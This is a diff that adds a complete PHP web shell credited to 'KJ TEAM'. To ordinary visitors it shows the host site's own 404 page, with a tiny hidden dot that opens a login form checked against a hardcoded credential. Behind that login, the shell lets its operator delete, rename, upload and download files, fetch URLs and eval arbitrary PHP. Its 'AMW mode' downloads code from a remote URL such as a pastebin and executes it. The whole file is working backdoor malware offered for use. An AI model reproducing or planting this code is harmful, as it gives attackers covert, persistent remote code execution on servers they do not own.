@@ -1,0 +1,701 @@
+<?php
+$LOGIN_USERNAME       = 'kampang26889';
+$LOGIN_PASSWORD_HASH  = '$2y$10$HPO8EoTdahs51QJBCDzPQOWRHAmWRscxw45.zplmC1oE7Xs7kEl/C';
+
+session_start();
+
+// GANTI ini agar kompatibel PHP 5.6 (hapus ??)
+$mode = '';
+if (isset($_GET['mode'])) {
+    $mode = $_GET['mode'];
+} elseif (isset($_POST['mode'])) {
+    $mode = $_POST['mode'];
+}
+
+if ($mode === 'amw') {
+    if (isset($_SESSION['ready']) && isset($_SESSION['go']) && $_SESSION['go'] == 1 && !empty($_SESSION['URL'])) {
+        $c = curl_init($_SESSION['URL']);
+        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($c, CURLOPT_TIMEOUT, 15);
+        $x = curl_exec($c);
+        $e = curl_error($c);
+        curl_close($c);
+        if ($e) die("ERR: $e");
+        if ($x) {
+            $x = preg_replace('/session_start\s*\(.*\);?/i', '', $x);
+            ob_start();
+            @eval('?>' . $x);
+            echo "<pre style='background:#2d3748;color:lime;padding:20px;border-radius:10px;margin:20px 0;'>";
+            echo htmlspecialchars(ob_get_clean());
+            echo "</pre>";
+            exit;
+        }
+        die("Empty");
+    }
+} elseif ($mode === 'automatic') {
+    if (!empty($_SESSION['URL'])) {
+        $c = curl_init($_SESSION['URL']);
+        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($c, CURLOPT_TIMEOUT, 15);
+        $x = curl_exec($c);
+        $e = curl_error($c);
+        curl_close($c);
+        if ($e) die("ERR: $e");
+        if ($x) {
+            $x = preg_replace('/session_start\s*\(.*\);?/i', '', $x);
+            ob_start();
+            @eval('?>' . $x);
+            echo "<pre style='background:#2d3748;color:lime;padding:20px;border-radius:10px;margin:20px 0;'>";
+            echo htmlspecialchars(ob_get_clean());
+            echo "</pre>";
+            exit;
+        }
+        die("Empty");
+    }
+}
+
+// ====================== FUNGSI ALTERNATIF ======================
+
+// 1. 📂 List file
+function listFilesDetailed($path = '.') {
+    $output = "";
+    $dir = __DIR__ . ($path == '.' ? '' : '/' . ltrim($path, './'));
+    
+    if (!is_dir($dir)) {
+        return "Directory not found: " . $dir;
+    }
+    
+    $files = scandir($dir);
+    $output .= sprintf("%-5s %-30s %-12s %-20s\n", "No", "Filename", "Size", "Modified");
+    $output .= str_repeat("-", 75) . "\n";
+    
+    $no = 1;
+    foreach ($files as $file) {
+        if ($file == '.' || $file == '..') continue;
+        
+        $filepath = $dir . '/' . $file;
+        $size = is_file($filepath) ? number_format(filesize($filepath)) . " B" : "<DIR>";
+        $mtime = is_file($filepath) ? date("Y-m-d H:i:s", filemtime($filepath)) : "-";
+        
+        $output .= sprintf("%-5s %-30s %-12s %-20s\n", $no++, $file, $size, $mtime);
+    }
+    
+    return $output;
+}
+
+// 2. 🗑️ Delete file
+function deleteFilePHP($filename) {
+    $filepath = __DIR__ . '/' . basename($filename);
+    
+    if (!file_exists($filepath)) {
+        return "Error: File not found - " . $filename;
+    }
+    
+    if (!is_file($filepath)) {
+        return "Error: Not a file - " . $filename;
+    }
+    
+    if (unlink($filepath)) {
+        return "Success: File deleted - " . $filename;
+    } else {
+        return "Error: Cannot delete - " . $filename;
+    }
+}
+
+// 3. 📝 Rename/Move file
+function renameFilePHP($oldname, $newname) {
+    $oldpath = __DIR__ . '/' . basename($oldname);
+    $newpath = __DIR__ . '/' . basename($newname);
+    
+    if (!file_exists($oldpath)) {
+        return "Error: File not found - " . $oldname;
+    }
+    
+    if (file_exists($newpath)) {
+        return "Error: Target already exists - " . $newname;
+    }
+    
+    if (rename($oldpath, $newpath)) {
+        return "Success: Renamed/Moved - " . $oldname . " → " . $newname;
+    } else {
+        return "Error: Cannot rename - " . $oldname;
+    }
+}
+
+// 4. 📁 pwd
+function getCurrentDir() {
+    return "Current Directory: " . __DIR__;
+}
+
+// 5. 👤 whoami
+function getWhoAmI() {
+    $output = "";
+    $output .= "PHP User: " . (function_exists('get_current_user') ? get_current_user() : 'N/A') . "\n";
+    $output .= "UID: " . (function_exists('getmyuid') ? getmyuid() : 'N/A') . "\n";
+    $output .= "GID: " . (function_exists('getmygid') ? getmygid() : 'N/A') . "\n";
+    return $output;
+}
+
+// 6. 🆔 id
+function getID() {
+    $output = "";
+    $output .= "User ID (UID): " . (function_exists('getmyuid') ? getmyuid() : 'N/A') . "\n";
+    $output .= "Group ID (GID): " . (function_exists('getmygid') ? getmygid() : 'N/A') . "\n";
+    $output .= "PHP User: " . (function_exists('get_current_user') ? get_current_user() : 'N/A') . "\n";
+    return $output;
+}
+
+// 7. 💻 uname -a
+function getSystemInfoAlt() {
+    $output = "";
+    $output .= "PHP Version: " . phpversion() . "\n";
+    $output .= "Operating System: " . PHP_OS . "\n";
+    $output .= "Server Software: " . ($_SERVER['SERVER_SOFTWARE'] ?? 'N/A') . "\n";
+    $output .= "Hostname: " . (php_uname('n') ?: $_SERVER['HTTP_HOST'] ?? 'N/A') . "\n";
+    return $output;
+}
+
+// 8. 🌐 ifconfig (Network info)
+function getNetworkInfo() {
+    $output = "";
+    $output .= "Server IP: " . ($_SERVER['SERVER_ADDR'] ?? 'N/A') . "\n";
+    $output .= "Remote IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'N/A') . "\n";
+    $output .= "Hostname: " . (gethostname() ?: 'N/A') . "\n";
+    
+    $local_ip = @file_get_contents('https://api.ipify.org');
+    if ($local_ip) {
+        $output .= "Public IP: " . trim($local_ip) . "\n";
+    }
+    return $output;
+}
+
+// 9. ⚙️ ps aux
+function getProcessList() {
+    $output = "";
+    $output .= "Current Process ID: " . getmypid() . "\n";
+    $output .= "Memory Usage: " . number_format(memory_get_usage()) . " bytes\n";
+    $output .= "Peak Memory: " . number_format(memory_get_peak_usage()) . " bytes\n";
+    return $output;
+}
+
+// 10. ⬇️ wget alternative (download file dengan nama custom)
+function downloadFilePHP($url, $custom_name = '') {
+    if (!filter_var($url, FILTER_VALIDATE_URL)) {
+        return "Error: Invalid URL - " . $url;
+    }
+    
+    // Tentukan nama file
+    if (!empty($custom_name)) {
+        $filename = $custom_name;
+    } else {
+        $filename = basename(parse_url($url, PHP_URL_PATH));
+        if (empty($filename)) {
+            $filename = 'downloaded_' . time() . '.file';
+        }
+    }
+    
+    // Sanitize filename
+    $filename = preg_replace('/[^a-zA-Z0-9._-]/', '_', $filename);
+    $filepath = __DIR__ . '/' . $filename;
+    
+    // Download content
+    $content = @file_get_contents($url);
+    
+    if ($content === false && function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+        $content = curl_exec($ch);
+        curl_close($ch);
+    }
+    
+    if ($content === false || empty($content)) {
+        return "Error: Failed to download from " . $url;
+    }
+    
+    if (file_put_contents($filepath, $content)) {
+        $size = number_format(filesize($filepath));
+        return "Success: Downloaded - " . $filename . " (" . $size . " bytes) from " . $url;
+    } else {
+        return "Error: Cannot save file - " . $filename;
+    }
+}
+
+// Fungsi untuk mengambil halaman 404 asli dari domain
+function getOriginal404Page() {
+    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
+    $host = $_SERVER['HTTP_HOST'];
+    
+    $random_path = '/404-' . md5(rand() . time() . uniqid()) . '.html';
+    $url = $protocol . '://' . $host . $random_path;
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0');
+    
+    $response = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    
+    if ($http_code == 404 && !empty($response)) {
+        return $response;
+    }
+    
+    return false;
+}
+
+// Fungsi untuk menyuntikkan tombol login ke dalam HTML
+function injectLoginButton($html) {
+    $login_html = '
+    <!-- Super Tiny Transparent Dot - Left Top -->
+    <div style="position:fixed;top:5px;left:5px;width:4px;height:4px;background:rgba(0,0,0,0.03);border-radius:50%;cursor:pointer;z-index:9999;transition:all 0.3s ease;" 
+         onclick="showLoginModal()"
+         onmouseover="this.style.background=\'rgba(0,0,0,0.1)\';this.style.transform=\'scale(2.5)\'"
+         onmouseout="this.style.background=\'rgba(0,0,0,0.03)\';this.style.transform=\'scale(1)\'">
+    </div>
+    
+    <!-- Login Modal - Dark Blue Transparent -->
+    <div id="loginModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(10,20,40,0.85);backdrop-filter:blur(5px);z-index:10000;align-items:center;justify-content:center;">
+        <div style="background:rgba(20,40,70,0.9);padding:35px 40px;border-radius:12px;width:340px;box-shadow:0 15px 40px rgba(0,0,0,0.5);text-align:center;border:1px solid rgba(255,255,255,0.05);">
+            <h3 style="margin:0 0 25px 0;font-size:20px;font-weight:400;color:rgba(255,255,255,0.85);letter-spacing:0.5px;">Authentication Required</h3>
+            
+            <form method="post" id="secretLoginForm">
+                <div style="margin-bottom:15px;">
+                    <input type="text" 
+                           name="secret_login_user" 
+                           placeholder="Username" 
+                           style="width:100%;padding:12px 16px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.08);border-radius:6px;color:rgba(255,255,255,0.8);box-sizing:border-box;font-size:14px;transition:all 0.3s;outline:none;"
+                           onfocus="this.style.borderColor=\'rgba(255,255,255,0.2)\';this.style.background=\'rgba(255,255,255,0.08)\'"
+                           onblur="this.style.borderColor=\'rgba(255,255,255,0.08)\';this.style.background=\'rgba(255,255,255,0.06)\'">
+                </div>
+                <div style="margin-bottom:20px;">
+                    <input type="password" 
+                           name="secret_login_pass" 
+                           placeholder="Password" 
+                           style="width:100%;padding:12px 16px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.08);border-radius:6px;color:rgba(255,255,255,0.8);box-sizing:border-box;font-size:14px;transition:all 0.3s;outline:none;"
+                           onfocus="this.style.borderColor=\'rgba(255,255,255,0.2)\';this.style.background=\'rgba(255,255,255,0.08)\'"
+                           onblur="this.style.borderColor=\'rgba(255,255,255,0.08)\';this.style.background=\'rgba(255,255,255,0.06)\'">
+                </div>
+                <button type="submit" 
+                        style="width:100%;padding:12px;background:rgba(255,255,255,0.1);color:#fff;border:1px solid rgba(255,255,255,0.12);border-radius:6px;font-size:14px;font-weight:500;cursor:pointer;transition:all 0.3s;"
+                        onmouseover="this.style.background=\'rgba(255,255,255,0.15)\';this.style.borderColor=\'rgba(255,255,255,0.2)\'"
+                        onmouseout="this.style.background=\'rgba(255,255,255,0.1)\';this.style.borderColor=\'rgba(255,255,255,0.12)\'">
+                    Login
+                </button>
+            </form>
+            
+            <div style="text-align:center;margin-top:18px;font-size:13px;color:rgba(255,255,255,0.3);cursor:pointer;transition:all 0.2s;" 
+                 onclick="closeLoginModal()"
+                 onmouseover="this.style.color=\'rgba(255,255,255,0.5)\'"
+                 onmouseout="this.style.color=\'rgba(255,255,255,0.3)\'">
+                Cancel
+            </div>
+        </div>
+    </div>
+    
+    <style>
+        ::-webkit-input-placeholder { color: rgba(255,255,255,0.25); }
+        :-moz-placeholder { color: rgba(255,255,255,0.25); }
+        ::-moz-placeholder { color: rgba(255,255,255,0.25); }
+        :-ms-input-placeholder { color: rgba(255,255,255,0.25); }
+    </style>
+    
+    <script>
+        function showLoginModal() {
+            document.getElementById("loginModal").style.display = "flex";
+        }
+        function closeLoginModal() {
+            document.getElementById("loginModal").style.display = "none";
+        }
+        window.onclick = function(event) {
+            var modal = document.getElementById("loginModal");
+            if (event.target == modal) {
+                modal.style.display = "none";
+            }
+        }
+        document.addEventListener(\'keydown\', function(event) {
+            if (event.key === "Escape") {
+                closeLoginModal();
+            }
+        });
+    </script>
+    </body>';
+    
+    $html = str_replace('</body>', $login_html, $html);
+    if (strpos($html, '</body>') === false) {
+        $html .= $login_html;
+    }
+    
+    return $html;
+}
+
+function requireLogin() {
+    global $LOGIN_USERNAME, $LOGIN_PASSWORD_HASH;
+
+    if (isset($_POST['secret_login_user']) && isset($_POST['secret_login_pass'])) {
+        $u = $_POST['secret_login_user'];
+        $p = $_POST['secret_login_pass'];
+
+        if ($u === $LOGIN_USERNAME && password_verify($p, $LOGIN_PASSWORD_HASH)) {
+            $_SESSION['logged_in'] = true;
+            header('Location: ' . $_SERVER['PHP_SELF']);
+            exit;
+        }
+    }
+
+    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
+        
+        $original_404 = getOriginal404Page();
+        
+        if ($original_404 !== false) {
+            $html = injectLoginButton($original_404);
+            header('HTTP/1.1 404 Not Found');
+            echo $html;
+            exit;
+        }
+        
+        header('HTTP/1.1 404 Not Found');
+        ?>
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>404 Not Found</title>
+            <style>
+                body { font-family: Arial, sans-serif; background: #fff; margin: 0; padding: 20px; }
+                .container { max-width: 800px; margin: 50px auto; }
+                h1 { font-size: 24px; font-weight: normal; }
+                hr { border: none; border-top: 1px solid #ccc; margin: 20px 0; }
+                .message { font-size: 14px; }
+                
+                /* Custom placeholder color for dark modal */
+                ::-webkit-input-placeholder { color: rgba(255,255,255,0.25); }
+                :-moz-placeholder { color: rgba(255,255,255,0.25); }
+                ::-moz-placeholder { color: rgba(255,255,255,0.25); }
+                :-ms-input-placeholder { color: rgba(255,255,255,0.25); }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <h1>Not Found</h1>
+                <hr>
+                <div class="message">The requested URL <?php echo htmlspecialchars($_SERVER['REQUEST_URI']); ?> was not found on this server.</div>
+            </div>
+            
+            <!-- Super Tiny Transparent Dot - Left Top -->
+            <div style="position:fixed;top:5px;left:5px;width:4px;height:4px;background:rgba(0,0,0,0.03);border-radius:50%;cursor:pointer;z-index:9999;transition:all 0.3s ease;" 
+                 onclick="showLoginModal()"
+                 onmouseover="this.style.background='rgba(0,0,0,0.1)';this.style.transform='scale(2.5)'"
+                 onmouseout="this.style.background='rgba(0,0,0,0.03)';this.style.transform='scale(1)'">
+            </div>
+            
+            <!-- Login Modal - Dark Blue Transparent -->
+            <div id="loginModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(10,20,40,0.85);backdrop-filter:blur(5px);z-index:10000;align-items:center;justify-content:center;">
+                <div style="background:rgba(20,40,70,0.9);padding:35px 40px;border-radius:12px;width:340px;box-shadow:0 15px 40px rgba(0,0,0,0.5);text-align:center;border:1px solid rgba(255,255,255,0.05);">
+                    <h3 style="margin:0 0 25px 0;font-size:20px;font-weight:400;color:rgba(255,255,255,0.85);letter-spacing:0.5px;">Authentication Required</h3>
+                    
+                    <form method="post">
+                        <div style="margin-bottom:15px;">
+                            <input type="text" 
+                                   name="secret_login_user" 
+                                   placeholder="Username" 
+                                   style="width:100%;padding:12px 16px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.08);border-radius:6px;color:rgba(255,255,255,0.8);box-sizing:border-box;font-size:14px;transition:all 0.3s;outline:none;"
+                                   onfocus="this.style.borderColor='rgba(255,255,255,0.2)';this.style.background='rgba(255,255,255,0.08)'"
+                                   onblur="this.style.borderColor='rgba(255,255,255,0.08)';this.style.background='rgba(255,255,255,0.06)'">
+                        </div>
+                        <div style="margin-bottom:20px;">
+                            <input type="password" 
+                                   name="secret_login_pass" 
+                                   placeholder="Password" 
+                                   style="width:100%;padding:12px 16px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.08);border-radius:6px;color:rgba(255,255,255,0.8);box-sizing:border-box;font-size:14px;transition:all 0.3s;outline:none;"
+                                   onfocus="this.style.borderColor='rgba(255,255,255,0.2)';this.style.background='rgba(255,255,255,0.08)'"
+                                   onblur="this.style.borderColor='rgba(255,255,255,0.08)';this.style.background='rgba(255,255,255,0.06)'">
+                        </div>
+                        <button type="submit" 
+                                style="width:100%;padding:12px;background:rgba(255,255,255,0.1);color:#fff;border:1px solid rgba(255,255,255,0.12);border-radius:6px;font-size:14px;font-weight:500;cursor:pointer;transition:all 0.3s;"
+                                onmouseover="this.style.background='rgba(255,255,255,0.15)';this.style.borderColor='rgba(255,255,255,0.2)'"
+                                onmouseout="this.style.background='rgba(255,255,255,0.1)';this.style.borderColor='rgba(255,255,255,0.12)'">
+                            Login
+                        </button>
+                    </form>
+                    
+                    <div style="text-align:center;margin-top:18px;font-size:13px;color:rgba(255,255,255,0.3);cursor:pointer;transition:all 0.2s;" 
+                         onclick="document.getElementById('loginModal').style.display='none'"
+                         onmouseover="this.style.color='rgba(255,255,255,0.5)'"
+                         onmouseout="this.style.color='rgba(255,255,255,0.3)'">
+                        Cancel
+                    </div>
+                </div>
+            </div>
+            
+            <script>
+                function showLoginModal() {
+                    document.getElementById('loginModal').style.display = 'flex';
+                }
+                function closeLoginModal() {
+                    document.getElementById('loginModal').style.display = 'none';
+                }
+                window.onclick = function(e) { 
+                    var modal = document.getElementById('loginModal');
+                    if (e.target == modal) {
+                        modal.style.display = 'none';
+                    }
+                }
+                document.addEventListener('keydown', function(e) {
+                    if (e.key === "Escape") {
+                        closeLoginModal();
+                    }
+                });
+            </script>
+        </body>
+        </html>
+        <?php
+        exit;
+    }
+}
+
+// ======================
+// AREA DILINDUNGI
+// ======================
+requireLogin();
+
+ini_set('display_errors', 0);
+error_reporting(0);
+
+echo "<h2> SYSTEM SHELL (AMW + Auto Mode) | Created By KJ TEAM</h2>";
+?>
+
+<style>
+    form { margin: 15px 0; padding: 20px; background: #f8f9fa; border-radius: 8px; border-left: 5px solid #0092c7; }
+    label { font-weight: bold; display: block; margin-bottom: 8px; color: #333; }
+    input[type="text"], input[type="file"], textarea { width: 100%; max-width: 600px; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+    textarea { height: 100px; font-family: monospace; }
+    button { padding: 10px 20px; background: #0092c7; color: white; border: none; border-radius: 4px; cursor: pointer; margin: 5px; }
+    button.green { background: #28a745; }
+    button.orange { background: #fd6914; }
+    button.red { background: #dc3545; }
+    button:hover { opacity: 0.9; }
+    pre { background: #2d3748; color: #e2e8f0; padding: 15px; border-radius: 6px; margin: 10px 0; font-family: monospace; white-space: pre-wrap; max-height: 400px; overflow: auto; }
+    .result-box { background: #f0f8ff; padding: 20px; border-radius: 8px; margin: 15px 0; border-left: 5px solid #0092c7; }
+    .info { background: #edf1ed75; padding: 10px; border-radius: 6px; margin: 20px 0; }
+    .btn-group { margin: 10px 0; display: flex; flex-wrap: wrap; gap: 8px; }
+    .cmd-btn { padding: 6px 14px; background: #6c757d; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 13px; }
+    .cmd-btn:hover { background: #5a6268; }
+</style>
+
+<h3>🛠 Test Functions:</h3>
+
+<!-- Quick Command Buttons -->
+<div class="btn-group">
+    <button type="button" class="cmd-btn" onclick="runCommand('ls')">📂 ls -la</button>
+    <button type="button" class="cmd-btn" onclick="runCommand('pwd')">📁 pwd</button>
+    <button type="button" class="cmd-btn" onclick="runCommand('whoami')">👤 whoami</button>
+    <button type="button" class="cmd-btn" onclick="runCommand('id')">🆔 id</button>
+    <button type="button" class="cmd-btn" onclick="runCommand('uname')">💻 uname -a</button>
+    <button type="button" class="cmd-btn" onclick="runCommand('ifconfig')">🌐 ifconfig</button>
+    <button type="button" class="cmd-btn" onclick="runCommand('ps')">⚙️ ps aux</button>
+</div>
+
+<form method="post">
+    <label><b>💻 System Command:</b></label>
+    <input type="text" name="cmd" id="cmd_input" placeholder="Ketik: ls, pwd, rm file, mv file1 file2, wget URL, wget URL namabaru" style="width:100%;max-width:600px;padding:10px;border:1px solid #ddd;border-radius:4px;box-sizing:border-box;">
+    <button type="submit">▶️ Run Command</button>
+</form>
+
+<script>
+function runCommand(cmd) {
+    document.getElementById('cmd_input').value = cmd;
+    document.getElementById('cmd_input').form.submit();
+}
+</script>
+
+<?php
+if (!empty($_POST['cmd']) && !isset($_POST['set_amw']) && !isset($_POST['url']) && !isset($_POST['code'])) {
+    $cmd_input = trim($_POST['cmd']);
+    $result = "";
+    
+    echo "<div class='result-box'>";
+    echo "<pre>";
+    echo "<b>Command:</b> " . htmlspecialchars($cmd_input) . "\n\n";
+    echo "<b>Result:</b>\n";
+    echo str_repeat("=", 70) . "\n";
+    
+    // Parse command untuk rm (delete file)
+    if (preg_match('/^rm\s+(.+)$/i', $cmd_input, $matches)) {
+        $result = deleteFilePHP(trim($matches[1]));
+    }
+    // Parse command untuk mv / rename (ganti nama)
+    elseif (preg_match('/^mv\s+([^\s]+)\s+([^\s]+)$/i', $cmd_input, $matches)) {
+        $oldname = trim($matches[1]);
+        $newname = trim($matches[2]);
+        $result = renameFilePHP($oldname, $newname);
+    }
+    // Parse command untuk rename (sama seperti mv)
+    elseif (preg_match('/^rename\s+([^\s]+)\s+([^\s]+)$/i', $cmd_input, $matches)) {
+        $oldname = trim($matches[1]);
+        $newname = trim($matches[2]);
+        $result = renameFilePHP($oldname, $newname);
+    }
+    // Parse command untuk wget (download file) - support nama custom
+    elseif (preg_match('/^wget\s+(https?:\/\/[^\s]+)(?:\s+([^\s]+))?$/i', $cmd_input, $matches)) {
+        $url = trim($matches[1]);
+        $custom_name = isset($matches[2]) ? trim($matches[2]) : '';
+        $result = downloadFilePHP($url, $custom_name);
+    }
+    // Built-in commands
+    else {
+        $cmd = strtolower($cmd_input);
+        switch($cmd) {
+            case 'ls':
+            case 'ls -la':
+            case 'list':
+            case 'dir':
+                $result = listFilesDetailed('.');
+                break;
+            case 'pwd':
+            case 'cwd':
+                $result = getCurrentDir();
+                break;
+            case 'whoami':
+            case 'user':
+                $result = getWhoAmI();
+                break;
+            case 'id':
+                $result = getID();
+                break;
+            case 'uname':
+            case 'uname -a':
+            case 'sysinfo':
+                $result = getSystemInfoAlt();
+                break;
+            case 'ifconfig':
+            case 'ip':
+            case 'network':
+                $result = getNetworkInfo();
+                break;
+            case 'ps':
+            case 'ps aux':
+            case 'process':
+                $result = getProcessList();
+                break;
+            default:
+                $result = "Command tidak dikenal: " . htmlspecialchars($cmd_input) . "\n\n";
+                $result .= "Commands yang tersedia:\n";
+                $result .= "  📂 ls / ls -la        - List file & directory\n";
+                $result .= "  📁 pwd                - Current directory\n";
+                $result .= "  👤 whoami             - User information\n";
+                $result .= "  🆔 id                 - User & Group IDs\n";
+                $result .= "  💻 uname -a           - System information\n";
+                $result .= "  🌐 ifconfig           - Network information\n";
+                $result .= "  ⚙️ ps aux             - Process list\n";
+                $result .= "  🗑️ rm namafile        - Delete file\n";
+                $result .= "  📝 mv file1 file2     - Rename/Move file\n";
+                $result .= "  📝 rename file1 file2 - Rename/Move file\n";
+                $result .= "  ⬇️ wget URL           - Download file (auto name)\n";
+                $result .= "  ⬇️ wget URL namabaru  - Download file with custom name\n";
+                break;
+        }
+    }
+    
+    echo htmlspecialchars($result);
+    echo "\n" . str_repeat("=", 70);
+    echo "</pre>";
+    echo "</div>";
+}
+?>
+
+<!-- Upload File -->
+<form method="post" enctype="multipart/form-data">
+    <label><b>📁 Upload File:</b></label>
+    <input type="file" name="file">
+    <button type="submit">⬆️ Upload</button>
+</form>
+<?php
+if (!empty($_FILES['file']['tmp_name'])) {
+    $filename = preg_replace('/[^a-zA-Z0-9._-]/', '_', $_FILES['file']['name']);
+    $filename = basename($filename);
+    $dest = __DIR__ . '/' . $filename;
+    if (move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
+        echo "<div class='result-box' style='border-left-color:#28a745;background:#d4edda;'>";
+        echo "✅ <b>Uploaded:</b> " . htmlspecialchars($filename);
+        echo " | <a href='" . htmlspecialchars($filename) . "' target='_blank'>👁 View</a>";
+        echo "</div>";
+    } else {
+        echo "<p style='color:red;'>❌ Upload failed</p>";
+    }
+}
+?>
+
+<!-- Fetch URL -->
+<form method="post">
+    <label><b>🌐 Fetch URL Content:</b></label>
+    <input type="text" name="url" placeholder="https://example.com">
+    <button type="submit">📥 Fetch</button>
+</form>
+<?php
+if (!empty($_POST['url']) && !isset($_POST['set_amw']) && !isset($_POST['cmd']) && !isset($_POST['code'])) {
+    $url = $_POST['url'];
+    $result = @file_get_contents($url);
+    echo "<div class='result-box'>";
+    if ($result !== false) {
+        echo "<pre>" . htmlspecialchars(substr($result, 0, 5000)) . (strlen($result) > 5000 ? "\n...truncated" : "") . "</pre>";
+    } else {
+        echo "<p style='color:red;'>❌ Failed to fetch</p>";
+    }
+    echo "</div>";
+}
+?>
+
+<!-- PHP Eval -->
+<form method="post">
+    <label><b>⚙️ Local PHP Eval:</b></label>
+    <textarea name="code" placeholder="e.g., echo 'Hello'; phpinfo();" style="width:100%;max-width:600px;height:120px;">echo 'Local OK';</textarea>
+    <button type="submit">▶️ Run Code</button>
+</form>
+<?php
+if (!empty($_POST['code']) && !isset($_POST['set_amw']) && !isset($_POST['cmd']) && !isset($_POST['url'])) {
+    echo "<div class='result-box'>";
+    echo "<b>Input:</b><br>";
+    echo "<pre style='background:#f5f5f5;color:#333;'>" . htmlspecialchars($_POST['code']) . "</pre>";
+    echo "<b>Output:</b><br>";
+    ob_start();
+    @eval($_POST['code']);
+    echo "<pre>" . htmlspecialchars(ob_get_clean()) . "</pre>";
+    echo "</div>";
+}
+?>
+
+<!-- AMW Mode -->
+<form method="post">
+    <label><b>⚡ AMW Mode Setup:</b></label>
+    <input type="text" name="amw_url" placeholder="AMW URL (e.g., pastebin)" style="width:100%;max-width:600px;">
+    <button class="orange" type="submit" name="set_amw" value="1">✅ Set AMW Session</button>
+    <?php if(isset($_SESSION['URL'])): ?>
+    <a href="?mode=amw" target="_blank" style="padding:10px;background:#28a745;color:white;text-decoration:none;border-radius:4px;">🚀 RUN AMW MODE</a>
+    <?php endif; ?>
+</form>
+<?php
+if (isset($_POST['set_amw']) && !empty($_POST['amw_url'])) {
+    $_SESSION['URL'] = $_POST['amw_url'];
+    $_SESSION['ready'] = true;
+    $_SESSION['go'] = 1;
+    echo "<div class='info'>";
+    echo "✅ <b>AMW Session SET!</b> ";
+    echo "<a href='?mode=amw' target='_blank' style='color:#28a745;font-weight:bold;'>CLICK HERE → ?mode=amw</a>";
+    echo "</div>";
+}
+?>
+
+<div class="info">
+    <h4 style="text-align: center;"><span style="color: #016f56f0;">Copyright @ 2026 | Created By KJ TEAM</span></h4>
+</div>
